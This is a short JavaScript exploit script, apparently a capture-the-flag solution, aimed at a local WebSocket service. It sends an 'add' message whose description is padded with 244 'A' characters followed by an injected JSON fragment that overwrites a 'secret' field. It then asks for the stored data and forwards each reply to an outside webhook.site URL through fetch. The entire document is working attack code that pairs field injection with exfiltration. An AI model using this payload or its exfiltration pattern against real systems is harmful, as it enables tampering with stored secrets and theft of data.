const target = '127.0.0.1';
const ws = new WebSocket(`ws://${target}/ws`);

ws.onopen = () => {
    ws.send(JSON.stringify({
        action: 'add',
        title: 'A',
        description: 'A'.repeat(244) + '","secret":"00000000000000000000000000000000"'
    }));
    ws.send(JSON.stringify({ action: 'get' }));
};

ws.onmessage = msg => {
    fetch(`https://webhook.site/2c4731b9-aac2-4eeb-8664-c60f0adc0b92?m=${encodeURIComponent(msg.data)}`);
};
